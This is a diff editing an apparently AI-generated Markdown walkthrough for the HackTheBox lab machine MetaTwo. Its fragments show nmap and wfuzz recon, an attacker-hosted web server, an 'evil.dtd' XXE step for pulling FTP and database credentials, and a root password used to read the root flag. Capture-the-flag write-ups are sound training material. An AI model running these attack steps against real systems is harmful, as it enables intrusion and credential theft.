@@ -1,8 +1,5 @@
-Here’s a clean, structured Markdown command reference for **HTB: MetaTwo** 🧠🔍 — tailored for organized note-taking and HTB prep:
+# 🧬 HTB: MetaTwo
 
----
-
-# 🧬 HTB: MetaTwo – Command & Exploitation Guide
 
 ## 🌐 Recon Phase
 
@@ -17,7 +14,7 @@ nmap -p 21,22,80 -sCV 10.10.11.186
 echo "10.10.11.186 metapress.htb" | sudo tee -a /etc/hosts
 ```
 
-### Wfuzz for Subdomains
+### [Wfuzz for Subdomains](HTTP)
 ```bash
 wfuzz -u http://10.10.11.186 -H "Host: FUZZ.metapress.htb" \
 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hh 145
@@ -88,7 +85,7 @@ python3 -m http.server 80
 
 ---
 
-## 🔐 Extract FTP + DB Credentials
+## 🔐 Extract [FTP](FTP) + DB Credentials
 
 From `evil.dtd`, modify to target:
 ```xml
@@ -156,7 +153,3 @@ su -
 # Enter root pass: p7qfAZt4_A1xo_0x
 cat /root/root.txt
 ```
-
----
-
-Let me know if you want this exported to `.md`, Notion, Obsidian, or as a printable cheat sheet! 🧩🔥
